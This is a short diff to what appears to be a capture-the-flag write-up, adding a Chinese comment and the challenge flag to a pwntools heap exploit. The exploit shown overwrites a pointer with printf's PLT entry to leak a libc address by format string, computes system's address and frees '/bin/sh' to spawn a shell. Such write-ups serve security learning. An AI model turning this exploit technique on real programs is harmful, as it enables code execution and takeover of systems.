@@ -251,6 +251,7 @@ free(1)
 alloc(0, 0x38, p64(elf.plt["printf"]))
 free("%21$llx")
 
+// r ??? 忘了當初打啥
 libc_start_main_ret = int(r(12), 16)
 libc_base = libc_start_main_ret - libc.symbols["__libc_start_main"] - 0xeb
 system_addr = libc_base + libc.symbols["system"]
@@ -266,3 +267,6 @@ free("/bin/sh\x00")
 io.interactive()
 
 ```
+
+
+>FLAG{r3all0c_the_memory_r3all0c_the_sh3ll}
